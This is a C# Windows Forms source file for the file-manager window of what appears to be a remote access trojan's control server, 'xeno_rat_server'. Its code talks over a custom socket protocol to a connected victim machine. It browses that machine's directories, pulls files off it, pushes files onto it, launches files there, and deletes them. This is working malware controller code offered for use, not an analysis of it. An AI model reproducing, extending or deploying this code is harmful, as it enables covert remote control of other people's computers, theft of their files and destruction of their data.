using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class File_manager : Form
    {
        Node client;
        FileView FileViewer;
        string currentDirectory = "";
        public File_manager(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            _=InitializeAsync();
        }
        public async Task InitializeAsync() 
        {
            FileViewer = new FileView(await CreateSubSubNode(client));
            await FileViewer.SendType();
            await UpdateListViewNonInvoke(currentDirectory);
        }
        public void TempOnDisconnect(Node node)
        {
            if (node == client)
            {
                if (FileViewer != null) 
                { 
                    FileViewer.client.Disconnect();
                }
                if (!this.IsDisposed)
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }
        public async Task FileUpload(string filepath, string savepath)
        {
            Node node = await CreateSubSubNode(client);
            byte[] type = new byte[] { 2 };
            await node.SendAsync(type);
            byte[] bytepath = Encoding.UTF8.GetBytes(savepath);
            await node.SendAsync(bytepath);
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("Upload Start Failed!");
                node.Disconnect();
                return;
            }
            if (data[0] == 0)
            {
                MessageBox.Show("Could not write to that directory/path");
                node.Disconnect();
                return;
            }

            ListViewItem lvi = new ListViewItem();
            lvi.Text = filepath;
            lvi.SubItems.Add("0%");
            lvi.SubItems.Add(savepath);
            lvi.SubItems.Add("Upload");

            listView2.BeginInvoke((Action)(() =>
            {
                listView2.Items.Add(lvi);
            }));

            try
            {
                using (FileStream stream = new FileStream(filepath, FileMode.Open, FileAccess.Read))
                {
                    byte[] block = new byte[500000];
                    int readcount;
                    long totalBytesSent = 0;
                    long fileSize = stream.Length;
                    bool failed = false;
                    while ((readcount = await stream.ReadAsync(block, 0, block.Length)) > 0)
                    {
                        byte[] blockBytes = new byte[readcount];
                        Array.Copy(block, blockBytes, readcount);
                        await node.SendAsync(blockBytes);
                        if (node.Connected() == false)
                        {
                            listView2.BeginInvoke((Action)(() =>
                            {
                                lvi.SubItems[1].Text = "Failed";
                            }));
                            MessageBox.Show("Error sending file!");
                            failed = true;
                            break;
                        }

                        totalBytesSent += readcount;

                        int percentage = (int)((double)totalBytesSent / fileSize * 100);
                        listView2.BeginInvoke((Action)(() =>
                        {
                            lvi.SubItems[1].Text = percentage.ToString() + "%";
                        }));
                    }

                    if (!failed)
                    {
                        listView2.BeginInvoke((Action)(() =>
                        {
                            lvi.SubItems[1].Text = "Complete";
                        }));
                    }
                }

            }
            catch
            {
                listView2.BeginInvoke((Action)(() =>
                {
                    lvi.SubItems[1].Text = "Failed";
                    MessageBox.Show("Error reading file!");
                }));
            }
            await Task.Delay(500);
            node.Disconnect();
        }


        public async Task FileDownload(string path, string savepath)
        {
            Node node = await CreateSubSubNode(client);
            byte[] type = new byte[] { 1 };
            await node.SendAsync(type);
            await node.SendAsync(Encoding.UTF8.GetBytes(path));
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("Download Start Failed!");
                node.Disconnect();
                return;
            }
            if (data[0] == 0)
            {
                MessageBox.Show("Could not access the file or file does not exist");
                node.Disconnect();
                return;
            }
            long fileSize = Utils.BytesToLong(await node.ReceiveAsync());
            long receivedBytes = 0;
            bool failed=false;
            ListViewItem lvi = new ListViewItem();
            lvi.Text = path;
            lvi.SubItems.Add("0%");
            lvi.SubItems.Add(savepath);
            lvi.SubItems.Add("Download");

            listView2.BeginInvoke((Action)(() =>
            {
                listView2.Items.Add(lvi);
            }));

            try
            {
                using (FileStream fileStream = new FileStream(savepath, FileMode.Create, FileAccess.Write))
                {
                    while (true)
                    {
                        byte[] fileData = await node.ReceiveAsync();
                        if (fileData == null)
                        {
                            if (fileStream.Length == fileSize) 
                            {
                                break;
                            }
                            MessageBox.Show("Error with file read");
                            node.Disconnect();

                            listView2.BeginInvoke((Action)(() =>
                            {
                                lvi.SubItems[1].Text = "Failed";
                            }));
                            failed = true;
                            break;
                        }
                        await fileStream.WriteAsync(fileData, 0, fileData.Length);
                        receivedBytes += fileData.Length;

                        int percentage = (int)((double)receivedBytes / fileSize * 100);

                        listView2.BeginInvoke((Action)(() =>
                        {
                            lvi.SubItems[1].Text = percentage.ToString() + "%";
                        }));

                        if (fileData.Length < 500000)
                        {
                            break;
                        }
                    }
                }

                if (!failed)
                {
                    listView2.BeginInvoke((Action)(() =>
                    {
                        lvi.SubItems[1].Text = "Complete";
                    }));
                }
            }
            catch
            {
                MessageBox.Show("Error writing to save file path");
                node.Disconnect();

                listView2.BeginInvoke((Action)(() =>
                {
                    lvi.SubItems[1].Text = "Failed";
                }));

                return;
            }
            await Task.Delay(500);
            node.Disconnect();
        }

        public async Task StartFile(string path) 
        {
            Node node = await CreateSubSubNode(client);
            byte[] type = new byte[] { 3 };
            await node.SendAsync(type);
            await node.SendAsync(Encoding.UTF8.GetBytes(path));
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("OpenFile Start Failed!");
                node.Disconnect();
                return;
            }
            if (data[0] == 0)
            {
                MessageBox.Show("Could not open the file or file does not exist");
                node.Disconnect();
                return;
            }
        }
        public async Task DeleteFile(string path)
        {
            Node node = await CreateSubSubNode(client);
            byte[] type = new byte[] { 4 };
            await node.SendAsync(type);
            await node.SendAsync(Encoding.UTF8.GetBytes(path));
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("Delete Start Failed!");
                node.Disconnect();
                return;
            }
            if (data[0] == 0)
            {
                MessageBox.Show("Could not delete the file or file does not exist");
                node.Disconnect();
                return;
            }
        }
        private async Task UpdateListViewNonInvoke(string path)
        {
            FileData Data = await FileViewer.GetInfo(path);
            if (!Data.sucess)
            {
                textBox1.Text = currentDirectory;
                MessageBox.Show("There was a problem access that Directory, most likely access denied");
                return;
            }
            currentDirectory = path;
            textBox1.Text = currentDirectory;
            listView1.BeginUpdate();
            listView1.Items.Clear();
            if (path != "")
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Tag = path;
                lvi.Text = "..";
                lvi.SubItems.Add("Directory");
                listView1.Items.Add(lvi);
            }
            foreach (string i in Data.Directories)
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Tag = i;
                lvi.Text = new DirectoryInfo(i).Name;
                lvi.SubItems.Add("Directory");
                listView1.Items.Add(lvi);
            }
            foreach (string i in Data.Files)
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Tag = i;
                lvi.Text = new DirectoryInfo(i).Name;
                lvi.SubItems.Add("File");
                listView1.Items.Add(lvi);

            }
            listView1.EndUpdate();
        }

        private async Task<Node> CreateSubSubNode(Node client)
        {
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found =await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private async void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            string path = listView1.SelectedItems[0].Tag as string;
            string dir = listView1.SelectedItems[0].SubItems[0].Text;
            string type = listView1.SelectedItems[0].SubItems[1].Text;
            if (type != "Directory") return;
            if (dir == "..")
            {
                string newpath = "";
                if (Path.GetPathRoot(path) != path)
                {
                    newpath = Path.GetFullPath(Path.Combine(path, ".."));
                }
                await UpdateListViewNonInvoke(newpath);
            }
            else 
            { 
                string newpath= Path.GetFullPath(Path.Combine(currentDirectory, dir));
                await UpdateListViewNonInvoke(newpath);
            }
        }

        private async void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter)
            {
                await UpdateListViewNonInvoke(textBox1.Text);
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
        private void DownloadMenuItem_Click(object sender, EventArgs e)
        {
            MenuItem menuItem = (MenuItem)sender;
            ListViewItem selectedItem = (ListViewItem)menuItem.Tag;

            // Get the necessary information from the selected item
            string path = (string)selectedItem.Tag;

            // Create and configure the SaveFileDialog in a new STA thread
            Thread staThread = new Thread(() =>
            {
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.FileName = Path.GetFileName(path); // Set the default file name
                saveFileDialog.Filter = "All Files (*.*)|*.*"; // Specify the file type filter

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string savepath = saveFileDialog.FileName;

                    // Call the FileDownload method or perform the download logic here
                    _ = FileDownload(path, savepath);
                }
            });

            staThread.SetApartmentState(ApartmentState.STA); // Set the thread's apartment state to STA
            staThread.Start();
        }



        private async void OpenMenuItem_Click(object sender, EventArgs e)
        {
            MenuItem menuItem = (MenuItem)sender;
            ListViewItem selectedItem = (ListViewItem)menuItem.Tag;

            string filePath = (string)selectedItem.Tag;

            await StartFile(filePath);
        }

        private async void DeleteMenuItem_Click(object sender, EventArgs e)
        {
            MenuItem menuItem = (MenuItem)sender;
            ListViewItem selectedItem = (ListViewItem)menuItem.Tag;

            string filePath = (string)selectedItem.Tag;

            await DeleteFile(filePath);
            await UpdateListViewNonInvoke(currentDirectory);

        }
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                
                ListViewItem selectedItem = listView1.FocusedItem;
                if (selectedItem != null && selectedItem.SubItems[1].Text=="File")
                {
                    ContextMenu contextMenu = new ContextMenu();

                    // Download option
                    MenuItem downloadMenuItem = new MenuItem("Download");
                    downloadMenuItem.Tag = selectedItem;
                    downloadMenuItem.Click += DownloadMenuItem_Click;
                    contextMenu.MenuItems.Add(downloadMenuItem);

                    // Open option
                    MenuItem openMenuItem = new MenuItem("Open");
                    openMenuItem.Tag = selectedItem;
                    openMenuItem.Click += OpenMenuItem_Click;
                    contextMenu.MenuItems.Add(openMenuItem);

                    // Delete option
                    MenuItem deleteMenuItem = new MenuItem("Delete");
                    deleteMenuItem.Tag = selectedItem;
                    deleteMenuItem.Click += DeleteMenuItem_Click;
                    contextMenu.MenuItems.Add(deleteMenuItem);

                    // Show the context menu at the mouse position
                    contextMenu.Show(listView1, e.Location);
                }
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
           await UpdateListViewNonInvoke(currentDirectory);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread staThread = new Thread(() =>
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Title = "Select File";
                openFileDialog.Filter = "All Files (*.*)|*.*";
                openFileDialog.CheckFileExists = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string filePath = openFileDialog.FileName;
                    string fileName = Path.GetFileName(filePath);
                    string savePath = Path.Combine(currentDirectory, fileName);

                    _ = FileUpload(filePath, savePath);
                }
            });

            staThread.SetApartmentState(ApartmentState.STA); // Set the thread's apartment state to STA
            staThread.Start();
        }


    }
    class FileData 
    {
        public bool sucess = true;
        public List<string> Directories= new List<string>();
        public List<string> Files = new List<string>();
    }
    class FileView
    {
        public Node client;
        public FileView(Node _client)
        {
            client = _client;
        }
        public async Task SendType() 
        {
            byte[] type = new byte[] { 0 };
            await client.SendAsync(type);
        }
        public async Task<FileData> GetInfo(string path) 
        {
            FileData data = new FileData();
            byte[] byte_path = Encoding.UTF8.GetBytes(path);
            await client.SendAsync(byte_path);
            bool worked = (await client.ReceiveAsync())[0]==1;
            if (worked)
            {
                int dirslength = client.sock.BytesToInt(await client.ReceiveAsync());
                for (int _=0;_< dirslength; _++) 
                {
                    data.Directories.Add(Encoding.UTF8.GetString(await client.ReceiveAsync()));
                }
                int fileslength = client.sock.BytesToInt(await client.ReceiveAsync());
                for (int _ = 0; _ < fileslength; _++)
                {
                    data.Files.Add(Encoding.UTF8.GetString(await client.ReceiveAsync()));
                }
            }
            else 
            {
                data.sucess = false;
            }
            return data;

        }
        
    }
}
